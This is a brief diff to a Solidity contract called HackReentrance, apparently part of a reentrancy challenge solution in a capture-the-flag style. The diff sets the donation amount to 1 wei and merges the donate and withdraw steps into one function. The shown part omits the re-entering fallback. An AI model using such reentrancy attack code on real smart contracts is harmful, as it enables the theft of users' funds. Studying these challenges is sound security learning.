@@ -9,7 +9,7 @@ interface IReentrance {
 contract HackReentrance {
   IReentrance public reentranceAddress;
   uint public amountToWithdraw = 1 ether;
-  uint public amountToDonate = 1 gwei;
+  uint public amountToDonate = 1;
 
   constructor(IReentrance _reentranceAddress) public payable {
     reentranceAddress = IReentrance(_reentranceAddress);
@@ -17,9 +17,6 @@ contract HackReentrance {
 
   function becomeDonor() public {
     reentranceAddress.donate.value(amountToDonate)(address(this));
-  }
-
-  function startAttack() public {
     reentranceAddress.withdraw(amountToWithdraw);
   }
 
